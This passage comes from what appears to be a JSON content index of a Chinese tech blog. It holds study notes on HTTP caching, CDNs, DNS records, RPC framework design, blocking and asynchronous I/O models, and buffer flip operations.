从这个角度看，协商缓存的方式节省了流量。对于小明开发的这个接口，多数情况下协商缓存会生效。当小明更新了数据后，协商缓存失效，客户端数据可以马上更新。 和强制缓存相比，协商缓存的代价是需要多发一次请求。 总结目前 HTTP 协议已经发展到 2.0 版本，不少网站都更新到 HTTP 2.0 大部分浏览器、CDN 也支持 HTTP 2.0 HTTP 3.0 也在建设当中，HTTP 3.0 对 HTTP 2.0 兼容，主要调整发生在网络底层","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"CDN 内容分发网络","slug":"计网/CDN内容分发网络","date":"2021-07-06T10:36:01.000Z","updated":"2021-07-08T01:01:18.022Z","comments":true,"path":"2021/07/06/计网/CDN内容分发网络/","link":"","permalink":"https://www.shanghua.live/2021/07/06/%E8%AE%A1%E7%BD%91/CDN%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/","excerpt":"","text":"今天使用的电商、直播、社交工具、视频网站中都含有大量的图片、视频、文档等，这些资源需要分发给用户。对于一些体量较大的应用来说，如果把大量资源集中到单一节点进行分发，恐怕很难有某个机房可以支撑得住这么大的流量。例如一个日活在 100W 的小型互联网产品，如果每次请求需要 1M 的数据，那就刚好是近 1TB 数据。对于这样的数据规模而言，完全由单一节点进行分发是不现实的。因此现在互联网应用在分发内容的时候，并不是从自己架设的服务器上直分发内容，而是走一个叫作内容分发网络（Content Dilivery Network）的互联网底层建设。 CDN 是什么内容分发网络（Content Dilivery Network，CDN） 一个专门分发内容的分布式应用，CDN 构建在现有的互联网之上，通过在各地部署数据中心，让不同地域的用户可以就近获取内容这里的内容指的就是 文件、图片、视频、声音、应用程序安装包 为什么不能提供这些资源呢？这和域名系统的 DNS 记录不能集中提供是一个道理，需要考虑到流量、单点故障、延迟等因素。在离用户更近的地理位置提供资源，可以减少延迟。按照地理位置分散提供资源，也可以降低中心化带来的服务压力 因此，CDN 的服务商会选择在全球布点，或者在某个国家布点。具体要看 CDN 服务提供商的服务范围。目前国内的阿里云、腾讯云等也在提供 CDN 业务。 内容的分发 当一个用户请求一个网络资源时，用户请求的是 CDN 提供的资源 当用户请求一个资源时，首先会接触到一个类似域名系统中目录的服务，这个服务会告诉用户究竟去哪个 IP 获取这个资源 很多大型的应用，会吧 DNS 解析作为一种负载均衡的手段 当一个用户请求一个一个网址的时候，会从该网络提供的智能 DNS 中获取网站的 IP。具体请求哪个 IP，是由智能 DNS 中的服务决定的。域名系统允许网站自己为自己的产品提供 DNS 解析，可以参考 DNS 域名解析系统 介绍的 NS 记录 当用户请求一个静态资源的时候，首先会触发域名系统的解析。域名系统会将解析的责任交由 CDN 提供商来处理，CDN 的智能 DNS 服务会帮助用户选择离自己距离最近的节点，返回这个节点的 A（或 AAAA）记录。然后客户端会向 CDN 的资源节点发起请求，最终获得资源。 在上面整个过程当中，CDN 的智能 DNS 还充当了负载均衡的作用。如果一个节点压力过大，则可以将流量导向其他的节点。 回溯CDN 主要用途是提供分发静态资源，那么静态资源提供者如何将资源提供到 CDN 呢？手动上传、接口推送，还是其他别的方式呢？ 你可以把 CDN 想象成一个分布式的分级缓存，再加上数据库的两层设计，用户请求先到达缓存层，如果缓存被穿透，才到达最终的存储层。缓存的设计是分布式的，因为绝大多数的资源使用都会发生在缓存上，只有极少数的请求才会穿透到底层的存储，通常这种设计缓存至少需要挡住 99% 的流量，那么实际的数据存储可以交由源站点完成 单一数据源（Single Souce of Truth，SSOT）在程序设计中，应该尽可能的去减少数据的来源，最好每个数据来源都只有单独一份这样能够避免大量的数据不一致以及同步数据的问题。基于这样的设计，谁来提供资源的存储呢？如果 CDN 提供一份资源的存储不就有两个数据源了吗? 而且只有服务的提供者才能更好的维护这个资源仓库。 在 CDN 的设计当中，CDN 实际上提供的是数据的缓存。而原始数据，则由服务的提供者提供。举个例子，当用户请求某个拉勾网站的静态图片，实际上如果你是要 DIG 命令查看这个网址，会看到如下图所示的结果列如 dig www.lgstatic.com ，就可以看到下面的结果 12345678910111213141516171819202122$ dig www.lgstatic.com ; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; www.lgstatic.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 59409;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 65494;; QUESTION SECTION:;www.lgstatic.com. IN A;; ANSWER SECTION:www.lgstatic.com. 20 IN CNAME www.lgstatic.com.wswebpic.com.www.lgstatic.com.wswebpic.com. 30 IN A 111.7.109.98www.lgstatic.com.wswebpic.com. 30 IN A 111.7.109.87;; Query time: 32 msec;; SERVER: 127.0.0.53#53(127.0.0.53);; WHEN: 三 7月 07 17:24:28 CST 2021;; MSG SIZE rcvd: 117 上面的结果中，拉勾网的静态资源域名 www.lgstatic.com 被 CNAME 到了 www.lgstatic.com.wswebpic.com. 说明当用户请求 www.lgstatic.com 的资源时，实例请求的是 CDN 服务提供商的域名。当用户向 CDN 请求资源的时候，CDN 的智能 DNS 服务就会帮助用户选最优的节点（比如地理上最临近，或者当前比较空闲的）。如果 CDN 节点资源已经存在了用户请求的资源，那么直接返回资源给用户。如果 CDN 中尚未缓存这个资源，此时 CDN 节点就会向拉勾请求资源。也就是说，拉勾网需要有所有的原始数据，并提供出来可以让 CDN 服务访问。 如下图所示，整个过程是 4 个层级。用户请求静态资源通常用自己的域名（防止跨域和一些安全问题）。为了让用户请求的是自己的网站，而使用的是 CDN 的服务，这里会使用 CNAME 让自己的域名作为 CDN 域名的一个别名。当请求到 CDN 服务的时候，会首先由 CDN 的 DNS 服务帮助用户选择一个最优的节点，这个 DNS 服务还充当了负载均衡的作用。接下来，用户开始向 CDN 节点请求资源。如果这个时候资源已经过期或者还没有在 CDN 节点上，就会从源站读取数据，这个步骤称为回溯 flowchart LR A[请求拉勾的图片] --通常伴随 CNAME--&gt; B[CDN 的 DNS 服务] B --负载均衡--&gt; C[CDN 资源节点] C --回溯--&gt; 拉勾服务器 CDN 上缓存的资源通常也会伴随失效时间的设置，当失效之后同样会触发回源，可以通过开发 API 或者 CDN 管理后台直接删除缓存（让资源失效），这个操作后，同样会触发回源 总结CDN 是一种网络应用，作用是分发互联网上的资源。CDN 服务的提供商，会在世界（或国家）范围内设立数据中心，帮助分发资源。用户请求的资源会被 CDN 分发到最临近的节点获取。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"DNS 域名解析系统","slug":"计网/DNS域名解析系统","date":"2021-07-04T17:31:49.000Z","updated":"2021-07-04T11:45:16.776Z","comments":true,"path":"2021/07/05/计网/DNS域名解析系统/","link":"","permalink":"https://www.shanghua.live/2021/07/05/%E8%AE%A1%E7%BD%91/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"DNS 域名解析系统DNS 和统一资源定位服 (URL) 域名系统本质是定位资源 这是一个完整的 URL（Uniform Resource Locator） https://www.example.com:8080/books?id=1000#Good https:// 对应 Scheme：协议，Scheme 有 https、ftp、ssh 等 www.example.com 对应 Host Host 代表站点 8080 对应 端口，代表提供服务的应用 /books 对应 Path，代表资源在服务中的路径 id=1000 对应 Query，查询条件，代表需要的是资源中的某一个部分 #Good 对应 Fragment 代表 二级查询条件，通常不在服务端响应，而是用于前端展示定位内容 统一资源定位符 URL（Uniform Resource Locator）,这样我们就可以通过一个字符串定位互联网资源总的来说，URL 是一种树状的设计， Host 代表主机（对应的 IP 地址由 DNS 服务提供）；Port 代表应用；Path 代表资源在应用中的路径；Query 代表对资源的查询条件。通过这种设计，互联网中万亿级别的资源都可以得到有效区分。 在计算机中，树状结构在计算机中非常常见，比如目录的设计，源代码块的嵌套设计 JSON 和 XML 的设计，都是树桩关系这源于人类的思考方式天然地喜欢把事物放到互斥的分类当中。 不过需要注意的是，树状的分类解决不了一个东西在多个类别的情况，而这种情况在多数时候却是真实存在的。真实世界中事物是普遍联系的，所以本质上事物之间的联系应该是图。但是通常情况下，我们会用树处理某一个方面的诉求。比如用 URL 描述资源的位置，然后用搜索引擎通过关键字反查 URL（另一个方面，维度等）。 域名系统DNS（Domain Name System，域名系统） 一个域名和 IP 地址相互映射的分布式服务，比如你想访问 shangghua.live 的 IP 地址，就需要通过 DNS 服务获得，这样凡是访问本博客的用户，就不需要在浏览器中输入博客的 IP 地址，而是通过一个方便人们记忆的域名 根域名服务器DNS 本身是一个出色的分布式架构 位于最顶层的是根域名服务器（Root Name Server）。人们在全世界范围内搭建了多台根域名服务器，2016 年的统计数据中，全世界目前有 13 台 IPv4 根服务器，25 台 IPv6 根服务器。 根域名服务器存储的不是域名和 IP 的映射关系，而是一个目录，如果将所有的域名记录都存放到根域名服务器，从存储量上来说，不会非常巨大但是如果全世界所有的 DNS 请求都集中到少量的根服务器上，这个访问流量就会过于巨大，。而且一旦发生故障，很容易导致大面积瘫痪。而且因为根服务器较少，所以如果全部都走根服务器，不同客户端距离根服务器距离不同，感受到的延迟也不一样，这样对用户来说不太友好。 因此，因为流量、防止单点故障、平衡地理分布等问题，根域名服务器只是一个目录，并不提供具体的数据。 域名分级和数据分区根服务器提供的目录有一定的索引规则，在域名的世界中，通过分级域名的策略建立索引我们知道中文字典可以按照偏旁部首以及拼音索引，和字典类似，根服务器提供的目录也有一定的索引规则 平时我们看到的.com.cn.net等，称为顶级域名。比如对于 www.shanghua.live 这个网址来说，com是顶级域名，shanghua是二级域名，www是三级域名。域名分级当然是为了建立目录和索引，并对数据存储进行分区。 graph TD A[根 DNS 服务器] --&gt; B[com DNS 服务器] B --&gt; baidu B --&gt; taobao A --&gt; C[net DNS 服务器] A --&gt; D[org DNS 服务] A --&gt; E[...] 顶部第一级是根 DNS 存储，存储的是顶级域的目录，被称作根 DNS 服务器 第二级是顶级域存储，存储的是二级域的目录，被称作顶级域 DNS 服务器（Top Level DNS，TLD） 最后一级是叶子节点，存储的是具体的 DNS 记录，也被称作权威 DNS 服务器。 DNS 查询过程 用户自己的路由器中的 DNS 缓存 小区的 DNS 服务器 ISP 的 DNS 服务器 graph TD A[请求 www.shanghua.live] --1--&gt; B[本地 DNS 服务器] B --2--&gt; C[根 DNS 服务器] C --3--&gt; B B --4--&gt; D[TLS DNS 服务器] D --5--&gt; B B --6--&gt; E[权威 DNS 服务器] E --7--&gt; B B --8--&gt; A 本地 DNS 是一系列 DNS 的合集，比如 ISP 提供的 DNS、公司网络提供的 DNS 本地 DNS 是一个代理，将 DNS 请求转发到 DNS 网络中 如果本地 DNS 缓存中找到了对应的 DNS 条目，就会直接返回，而跳过之后的步骤 客户端根据请求根 DNS 服务器。如果本地 DNS 中没有对应的记录，那么请求就会被转发到根 DNS 服务器，根 DNS 服务器只解析顶级域名,也就是 com 的部分 根 DNS 服务器返回顶级 DNS 服务器的 IP。 客户端请求顶级 DNS 服务器，顶级 DNS 服务器中是具体域名的目录。 顶级 DNS 服务器返回权威 DNS 服务器的 IP。 客户端请求权威 DNS 服务器。在权威 DNS 服务器上存有具体的 DNS 记录。以 lagou 为例，权威 DNS 服务器中可能有和 lagou.com 相关的上百条甚至更多的 DNS 记录，会根据不同的 DNS 查询条件返回 权威 DNS 服务器返回 DNS 记录到本地 DNS 服务器。 本地 DNS 服务器返回具体的 DNS 记录给客户端。 在上述 8 个过程全部结束后，客户端通过 DNS 记录中的 IP 地址，可以找到请求服务的主机。从而获得 Web 服务。浏览器会缓存 DNS，操作系统、路由器、本地 DNS 服务器也会绝大数情况，请求不会到达 DNS 服务器 关于缓存如果在某个时刻同一区域内有一个用户触发过上述 1 ~ 8 的过程，另一个同区域的用户就可以在本地 DNS 服务器中获得 DNS 记录，而不需要再走到根 DNS 服务器这种设计我们称之为 分级缓存策略在分级缓存策略中，每一层都会进行缓存，经过一层层的缓存，最终命中根 DNS 服务、顶级 DNS 服务器以及权威 DNS 服务的请求少之又少 DNS 记录一个 DNS 记录具体的样子 1www.example.com. IN A 16.162.59.31; IN 代表记录用于互联网，是 Intenet 的缩写 www.example.com 代表要解析的域名 A 代表记录的类型,代表这是一条解析 IPv4 的记录 16.162.59.31 是记录的值 ; 分号是语句块的结尾，也是注释 除了 A 记录，DNS 记录的类型非常多，有 30 多种，其中比较常见的有 A、AAAA、CNAME、MX，以及 NS 等 CNAMECNAME (CANONICAL Name Record) 用于定义域名的别名 1a.example.com. IN CNAME b.example.com; 这条 DNS 记录定义了 a.example.com 是 b.example.com 的别名，在浏览器中输入 a.example.com 后浏览器就能查找 a.example.com 为 b.example.com 的别名，就回去查找 b.example.com 的 A 记录 这样用户如果在浏览器输入 a.example.com 实际打开的就是 b.example.com。因为走的是 DNS 查询的路径，速度更快（因为有缓存）不需要 HTTP 重定向等操作 当你想把一个网站迁移到新的域名，旧的域名仍然保留的时候 当你想将自己的静态资源放到 CDN 上的时候，CNAME 就非常有用 AAAA 记录AAAA 记录与 A 记录类似，不过 A 记录记录的是 域名与 IPv4 的关系，AAAA 记录是 域名与 IPv6 的关系 MX 记录MX 记录是邮件记录，用来描述邮件服务器的域名。在工作中，我们经常会发邮件到某个同事的邮箱。比如说，发送一封邮件到 &#x78;&#x69;&#97;&#111;&#109;&#x69;&#110;&#x67;&#64;&#x73;&#104;&#x61;&#x6e;&#103;&#104;&#117;&#97;&#x2e;&#108;&#105;&#x76;&#x65;，那么如何知道哪个 IP 地址是邮件服务器呢？这时候就可以添加一条 MX 记录 1IN MX mail.shanghua.live 这样凡是 @shanghua 的邮件都会发送到 mail.shanghua.live 中，而 mail.shanghua.live 的 IP 地址，可以通过 mail.shanghua.live 的 A 记录 和 AAAA 记录获得 NS 记录NS（Name Server）记录是描述 DNS 服务器网址从 DNS 的存储结构上，Name Server 中含有权威 DNS 服务的目录NS 记录指定哪台 Server 是回答 DNS 查询的权威服务器，当一个 DNS 查询看到 NS 记录的时候，会再去 NS 记录配置的 DNS 服务器查询，得到最终结果 12a.com. IN NS ns1.a.coma.com. IN NS ns2.a.com 当解析 a.com 地址时，我们看到 a.com 有两个 NS 记录，所以确定最终 a.com 的记录在 ns1.a.com 和 ns2.a.com 上。从设计上看，ns1 和 ns2 是网站 a.com 提供的智能 DNS 服务器，可以提供负载均衡、分布式 Sharding 等服务。比如当一个北京的用户想要访问 a.com 的时候，ns1 看到这是一个北京的 IP 就返回一个离北京最近的机房 IP。 上面代码中 a.com 配置了两个 NS 记录。通常 NS 不会只有一个，这是为了保证高可用，一个挂了另一个还能继续服务。通常数字小的 NS 记录优先级更高，也就是 ns1 会优先于 ns2 响应。 配置了上面的 NS 记录后，如果还配置了 a.com 的 A 记录，那么这个 A 记录会被 NS 记录覆盖。 总结CNAME 记录的作用是？ CNAME 是一种 DNS 记录，作用是将一个域名映射到另一个域名，域名解析的时候，如果看到 CNAME 记录，则会从映射目标重新开始查询","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"RPC 框架","slug":"计网/RPC框架","date":"2021-07-03T10:42:57.000Z","updated":"2021-07-04T12:27:24.053Z","comments":true,"path":"2021/07/03/计网/RPC框架/","link":"","permalink":"https://www.shanghua.live/2021/07/03/%E8%AE%A1%E7%BD%91/RPC%E6%A1%86%E6%9E%B6/","excerpt":"","text":"RPCRPC（Remote Procedure Call）远程过程调用 在远程必选先定义这个方法，然后才可以通过 RPC 框架调用该方法，远程调用不仅可以传入参数、获取到返回值还可以捕捉调用过程中的异常 RPC 让远程调用就像本地调用一样 假设实现一个 rpc 对象，其中的 invode 方法可以实现远程调用 1var result = rpc.invode(&quot;greetings&quot;,arg1,arg2...) 这段程序将本地看作 一个 RPC 的客户端，将远程看作一个 RPC 的服务端。如下图所示： flowchart RL B[服务 B] --返回--&gt; D[RPC 服务端] D --本地方法调用--&gt; B A[服务 A] --远程方法调用--&gt; C[RPC 客户端] C --返回--&gt; A D &lt;--TCP&#x2F;UDP&#x2F;HTTP--&gt; C 服务 A 发起远程方法调用，RPC 客户端通过某种协议将请求发送给服务 B服务 B 解析请求，进行本地方法的调用，将结果返回到服务 B 的 RPC 服务端最终返回到服务 A。如果程序员没有意识到这是一次远程方法调用，就可能写出下面这段程序 123for(int i = 0;i &lt; 1000000;i++)&#123; rpc.invoke(...)&#125; 之所以可能写出，是因为你（程序员）没有意识到 rpc.invoke 是一次远程调用。在实际的操作过程中，rpc.invoke 可能被封装到某个业务方法中，程序员调用的时候便容易忽视这是一次远程操作。所以 RPC 调用时就要求你（程序员）对性能有清晰的认识 多路复用的优化RPC 提供的是远程方法的调用 本质上是数据的传递，传递数据有一个最基本的问题要处理，就是提高吞吐量 (单位时间传递的数据量)如果为每个远程调用（请求）建立一个连接，就会造成资源的浪费，因此通常我们会考虑多个请求复用一个连接叫做多路复用 在具体实现多路复用的时候，也会有不同的策略。假设要发送数据 A、B、C、D，那么一种方法是建立一个连接依次将 A、B、C、D 发过去，就像下面这样 —&gt; | &nbsp; A &nbsp; | &nbsp; B &nbsp; | &nbsp; C &nbsp; | &nbsp; D &nbsp; | —&gt; 子这种结构中，利用一个连接顺序发送 A、B、C、D 将多个请求放入一个连接的方式，节省了多次握手、挥手的时间，但是由于 ABCD 不是并行发送，而是顺序发送，当其中某个请求的体积较大时，容易阻塞其他请求，如下 —&gt; | &nbsp;&nbsp;&nbsp;&nbsp; A &nbsp;&nbsp;&nbsp;&nbsp; | &nbsp; B &nbsp; | &nbsp; C &nbsp; | &nbsp; D &nbsp; | —&gt; 在 A 较大的时候，B，C，D 就只能等 A 完全传送完成才能发生传送。这样模型对于 RPC 请求/响应大小不平均的网络不太友好体积小的请求/响应可能会因为一些大体积的请求/响应而延迟因此还有另一种常见的多路复用方案，就是将 A、B、C、D 切片一起传输，如下 顺序传输方案 —&gt; | &nbsp;&nbsp;&nbsp;&nbsp; A &nbsp;&nbsp;&nbsp;&nbsp; | &nbsp; B &nbsp; | &nbsp; C &nbsp; | &nbsp; D &nbsp; | —&gt; 上图中，用不同的块,代表不同的传输任务。采用顺序传输方案将 A、B、C、D 用一个连接传输节省了握手，挥手成本。切片传输的方案在这之上，将数据切片可以保证大、小任务并行，不会因为大任务阻塞小任务 另外还有一个需要考虑的点，单个 TCP 连接的极限传输速度是受到窗口大小，缓冲区等因素的制约，不一定可以用满网络资源。如果传输量特别大的时候，有可能需要考虑提供多个连接，每个连接再去考虑多路复用的情况 调用约定和命名远程调用一个函数 命名空间 + 类名 + 方法名 比如调用一个支付服务对象 Payservice 的 pay 方法 命名空间（trade.payment） 对象名称是（PayServer） 方法名称是（Pay） 例如用 ＃ 分割: trade.payment#PayService#Pay 在进行远程调用的时候，给远程方法命名是调用约定的一部分，通过调用命名下完整的名称调用远getName程方法 常用的做法是先不具体指定调用的方法，而是先创建一个远程对象的实例，比如上方 PayService 对象的实例这里会用到一些特别的编程技巧，比如代理设计模式、动态接口生成等。 不过归根结底，我们调用的本质就是字符串名称。而实现这个调用，你需要知道两件事情 IP 是多少，也就是方法在哪个机器上调用 端口是多少，也就是哪个服务提供这个调用 注册和发现调用的时候我们需要通过 字符串 获取 IP和端口（机器和服务 ） 在网络的时间中，需要的只是网络接口和 IP 地址，而操作系统区分应用需要的是端口在调用过程中，需要的是注册表，存储了字符串和 IP + 端口的对应关系我们可以使用 Redis 的 hash 对象存储这个对应关系 当我们上线一个服务的时候，就在 Redis 的某个 hash 对象中存储它和它对应的 IP 地址 + 端口列表通常，将写这个 hash 对象的过程称之为注册我们远程调用一个 RPC 服务的时候，调用端提供的是 RPC 服务的名称（例如：命名空间+对象+方法）根据名称查找到提供服务的 IP + 端口清单并指定某个 IP + 端口的过程称作为发现 但是并不能简单的这样理解为，注册就是写一个 Hash 表，发现就是查哈希表再决定服务的响应者在实际的设计中，需要考虑很多东西，例如基于 Redis 的实现如果所有 ROC 调用都需要去 Redis 查询，会造成负责发现的中间件压力较大RPC 调用者会缓存上一次调用的 IP + 端口，但是缓存又会造成数据会和注册表之间产生数据不一致的问题可以考虑由分布式共识服务比如 Zookeeper 提供订阅，让 RPC 调用者订阅到服务地址的变更，及时更新自己的缓存 负载均衡的设计在设计 RPC 框架的时候，负载均衡的设计往往需要和 RPC 框架一起考虑，因为 RPC 框架提供了注册、发现的能力，提供发现能力的模块本省就是一个负载均衡器，因此负载均衡可以看作发现模块的一个子组件。请求到达 RPC 的网关（或某个路由程序）后，发现组件会提供服务对应的所有实例（IP + 端口），然后负载均衡算法会指定其中一个响应这个请求。 可用性和容灾 当一个服务实例崩溃的时候（不可用），因为有发现模块的存在，可以及时从注册表中删除这个服务实例，只要服务本身有足够度的实例那么完全不可用的风险会大大降低，当然，可用性 百分之百 是不可能实现的。 注册表和 RPC 调用者之间必然存在不一致的现象，而且注册表的更新本身也可能滞后 如果遇到临时访问量剧增，需要扩容的场景，可以自动启动服务注册即可，这块可以用自动化脚本衔接。 总结设计一个 RPC 框架最基础的能力就是实现远程方法的调用。这里需要一个调用约定，比如怎么描述一个远程的方法，发送端怎么传递参数接收方如何解析参数，发生异常如何处理，具体来说，这些事情都不难实现，只是比较烦琐。其实不仅仅在 RPC 调用时有调用约定，编译器在实现函数调用的时候，也会有调用约定。另外，还有一些在 RPC 基础上建立起来的更复杂、更体系化的约定，比如说面向服务架构（SOA）。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"BIO、NIO 和 AIO","slug":"计网/网络IO模型","date":"2021-07-01T16:43:55.000Z","updated":"2021-07-01T09:56:19.019Z","comments":true,"path":"2021/07/02/计网/网络IO模型/","link":"","permalink":"https://www.shanghua.live/2021/07/02/%E8%AE%A1%E7%BD%91/%E7%BD%91%E7%BB%9CIO%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"BIO、NIO 和 AIO 有什么区别？从本质来说，讨论 BIO、NIO、AIO 的区别，就是讨论 I/O 的模型，我们可以从三个方面思考 变成模型：合理设计 API，让程序写得更舒服 数据的传输和转化成本：比如减少数据拷贝次数，合理压缩数据等。 高效的数据结构：利用好缓冲区、红黑树等 I/O 编程模型BIOBIO（Blocking I/O，阻塞I/O），API 的设计会阻塞程序调用 12// 程序会在这个地方阻塞，直到收到数据byte a = readKey() 假设 readKey 方法会从键盘中读取一个用户的按键，如果是阻塞 I/O 的设计，readKey 会阻塞当前用户线程直到用户按键阻塞态的线程如果要恢复执行，就要进行排队，也就是线程的上下文切换（Context Switch）：从一个线程切换到另一个线程 NIONIO （None Blocking I/O 非阻塞 IO），API 的设计不会阻塞程序的调用 1byte a = readKey() 假设 readKey 方法从键盘读取一个按键，如果是非阻塞 I/O 的设计，readKey 不会阻塞当前的线程，哪如果没有按键会怎么办， 在阻塞 I/O 的设计中，如果用户没有按键线程会阻塞等待用户按键 在非阻塞 I/O 的设计中，线程不会阻塞，没有按键会返回一个空值 AIOAIO（Asynchronous I/O,异步 I/O），API 的设计会多创造一条时间线 1234function callBackFuntion(byte keyCode)&#123; // 处理按键&#125;readKey(callBackFuntion) 在异步 I/O 中，readKey 方法会直接返回，但是没有结果，结果需要回调一个函数callBackFunction 去接受异步：时间线上无法同步的现象，不知道 callbackFunction 何时会执行 但是 异步 I/O 会产生回调地狱的问题，本质来说是因为 异步程序的时间线错乱导致维护成本较高，如下 123456789request(&quot;/order/123&quot;, (data1) -&gt; &#123; //.. request(&quot;/product/456&quot;, (data2) -&gt; &#123; // .. request(&quot;/sku/789&quot;, (data3) -&gt; &#123; //... &#125;) &#125;)&#125;) 一般情况我们会提供一种异步转换为同步程序的语法。如下 12345678Future future1 = request(&quot;/order/123&quot;)Future future2 = request(&quot;/product/456&quot;)Future future3 = request(&quot;/sku/789&quot;)// ...// ...order = future1.get()product = future2.get()sku = future3.get() request 函数是一次网络请求调用，请求订单 ID=123 的订单数据。本身 request 函数不会阻塞，会马上执行完成，而网络是一次异步请求，调用不会在 request(“/order/123”) 下一行结束，而是会在未来某个时间结束，因此我们用一个 Future对象封装这个异步操作，future.get() 是一个阻塞操作，会阻塞直到网络调用返回 在 request 和 future.get 之间，我们还可以进行别的操作，比如发送更多的请求，Future 这样能够将异步操作再同步主时间线的操作，我们称之为异步转同步，也叫做异步编程，通常一门语言如果能提供异步编程的能力，指的就是提供异步转同步的能力同步程序看起来更直观，并且更好维护 数据的传输和转化成本无论是那种 I/O 模型都要从数据从网卡拷贝到用户程序（接收），或者将数据从用户程序传输到网卡（发送） 有的数据需要编码解码，比如 JSON 格式的数据 有的数据需要进行压缩和解码 graph LR A[网卡] --&gt; B[内核] B --&gt; C[用户程序] 数据到网卡到内核到用户程序是两次传输。将数据从内存中的一个区域拷贝到另一个区域。这是一个 CPU 密集型操作数据的拷贝归根结底需要一个字节一个字节去做 从网卡到内核空间的这步操作，可以用 DMA （Direct Memory Access）技术控制。DMA 是一种小型设备，用 DMA 拷贝数据可以不使用 CPU，从而节省计算资源。通常我们写程序的时候，不能直接控制 DMA，因此 DMA 仅仅用于设备传输数据到内存中。不过，从内核到用户空间这次拷贝，可以用内存映射技术，将内核空间的数据映射到用户空间。 无论 I/O 的编程模型如何选择，数据传输和转化成本是逃不掉的，通过 DMA 技术和内存映射技术，就可以节省成本减少数据传输、数据压缩解压、数据编码解码 总结BIO、NIO 和 AIO 有什么区别？ 这三者是三个 I/O 的编程模型 BIO 接口设计会直接导致当前线程阻塞 NIO 的设计不会触发当前线程的阻塞 AIO 为 I/O 提供了异步能力；将 I/O 的响应程序放到一个独立的时间线去执行 通常 AIO 的提供者会提供异步编程模型，就是实现一种对异步计算封装的数据结构，并且提供将数据计算同步会主线的能力 这三种 API 都会伴随 I/O 多路复用 如果底层用红黑树管理注册的文件描述服和事件，可以在很小的开销内由内核将 I/O 消息发送给指定的线程","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"缓冲区 flip","slug":"计网/缓冲区flip","date":"2021-07-01T13:03:27.000Z","updated":"2021-07-01T08:42:23.061Z","comments":true,"path":"2021/07/01/计网/缓冲区flip/","link":"","permalink":"https://www.shanghua.live/2021/07/01/%E8%AE%A1%E7%BD%91/%E7%BC%93%E5%86%B2%E5%8C%BAflip/","excerpt":"","text":"缓冲区的 flip在计算机中，数据往往会被抽象陈流，然后传输。比如读取一个文件，数据会被抽象成文件流；播放一个视频，视频被抽象成视频流，处理节点为了防止过载，又会使用缓冲区削峰（减少瞬间压力）在传输协议中，应用往往先把数据放入缓冲区，然后再将缓冲区通过给发送数据的程序，发送数据的程序从缓冲区读取数据，然后进行发送。 流代表数据，具体来说是随着时间产生的数据，类比自然界的河流读取文件的时候，文件被抽象成流流的内部构造，决定了你每次能从文件中读取多少数据，从流中读取数据的操作，本质上是一种迭代器流的内部构造决定了迭代器每次能读取的数据规模 为什么需要缓冲区因为从文件读取数据这个操作，是一次磁盘的 I/O 操作，非常耗时。内核从文件系统读取到的数据是确定的，但里面的有效数据是不确定的。而无论读取打一个字节还是读取对个字节，都应该适配内核的底层行为，也就是说，每次流对象读取一个字节，内核可能会读取 2k、4k 的数据。这样的行为才能真的做到减少磁盘I/O 操作 哪为什么不直接读取几兆或者更大的数据呢？ 两个原因 如果是高并发场景下，并发读取数据时内存使用是根据并发数翻倍的，如果同时读取的数据量过大，可能会导致内存不足 读取 2k/4k 大很多倍的数据，比如 1M/2M 这种远远大于内存分页大小的数据，并不能提升性能 缓冲区缓冲区就是一块用来做缓冲的内存区域，为了应对频繁的字节读取，我们在内存中设置一个 2k 大小的缓冲区。这样读取 2048 次才会真正发生一次读取。 不仅仅如此，比如做一个秒杀系统，如果同时到达的流量过高，也可以使用缓冲区将用户请求先存储下来，再进行处理这个操作我们称之为削锋，削去流量的峰值缓冲区的数据通常具有朴素的公平，先进先出（FIFO）。从数据结构的设计上，缓冲区像一个队列。在实际的使用场景中缓冲区有自己的特别的需求 graph LR A[文件流] --&gt; B[缓冲区] B --&gt; C[网络流] 缓冲区需要支持两种操作： 写入数据 读取数据 清空（应对下一次请求） 那么具体怎么设计这个缓冲区？首先，数据可以考虑存放到一个数组中， 1| | | | | | | | 写入数据的时候，需要一个指针指向可以写入的位置 123 | | | | | | | | |position 每次写入数据，position 增加 1,比如写入 a,b,c,d 后 123| a | b | c | d | | | | | position 那么这个时候需要切换读状态怎么做呢？我们可以增加一个 limit 指针，随着写入指针一起增长 12345 limit | | a | b | c | d | | | | | position 当需要切换到读取状态时候，将 position 设置为 0，limit 不变即可 12345 limit | | a | b | c | d | | | | |position 我们将 position 设置为 0，limit 不变的操作称为 flip 操作，flip 本意是翻转，在这个场景中是读，写状态的切换读取操作可以循环从 position 一直读取到 limit 这样就可以读取 a,b,c,d 那么如果要继续写入应该怎么操作呢，这个时候就需要 clear 操作，这个操作会清空缓冲区。具体来说 clear 会将 position，limit 都设置为 0，就可以做到重复利用缓冲区了 写过程从 position = 0 开始，position 和 limit 一起自增。读取时，用 flip 操作切换缓冲区读写状态，读取数据完毕，用 clear重置缓冲区状态 总结流是随着时间产生的数据。数据抽象成流，是因为客观世界存在这样的现象。数据被抽象成流后，我们不需要把所有的数据都读取到内存中进行计算和迭代，而是每次处理或者计算一个缓冲区的数据。","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"EPoll 